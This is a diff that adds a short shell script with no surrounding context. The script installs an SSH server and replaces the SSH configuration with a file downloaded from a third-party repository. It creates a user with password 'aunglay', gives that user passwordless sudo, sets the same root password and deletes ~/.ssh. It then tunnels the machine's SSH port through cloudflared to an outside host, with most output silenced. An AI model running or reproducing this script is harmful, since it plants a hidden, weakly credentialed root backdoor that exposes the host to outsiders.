@@ -1,0 +1,23 @@
+apt install openssh-server screen sudo curl python3 -y &> /dev/null 
+rm -rf /etc/ssh/sshd_config &> /dev/null 
+cd /etc/ssh && wget https://github.com/githubaunglaymyanmar/fordownload/raw/main/ssh/sshd_config &> /dev/null 
+service ssh restart &> /dev/null 
+apt install sshpass screen -y &> /dev/null 
+useradd -m aunglay &> /dev/null 
+adduser aunglay sudo &> /dev/null 
+echo 'aunglay:aunglay' | sudo chpasswd &> /dev/null 
+sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd &> /dev/null 
+echo "aunglay ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
+printf "aunglay\naunglay" | passwd root &> /dev/null
+# Add cloudflare gpg key
+sudo mkdir -p --mode=0755 /usr/share/keyrings
+curl -fsSL https://pkg.cloudflare.com/cloudflare-public-v2.gpg | sudo tee /usr/share/keyrings/cloudflare-public-v2.gpg >/dev/null
+# Add this repo to your apt repositories
+echo 'deb [signed-by=/usr/share/keyrings/cloudflare-public-v2.gpg] https://pkg.cloudflare.com/cloudflared any main' | sudo tee /etc/apt/sources.list.d/cloudflared.list
+# install cloudflared
+sudo apt-get update && sudo apt-get install cloudflared
+
+
+screen -m -d -S cloudflared cloudflared access tcp --hostname connect1.aung1.xyz  --url localhost:4444 
+rm -rf ~/.ssh
+sshpass -p aunglay ssh -R 2323:localhost:22 root@localhost -o StrictHostKeyChecking=no -o "ServerAliveInterval 10000000" -o "ServerAliveCountMax 10000000" -p 4444
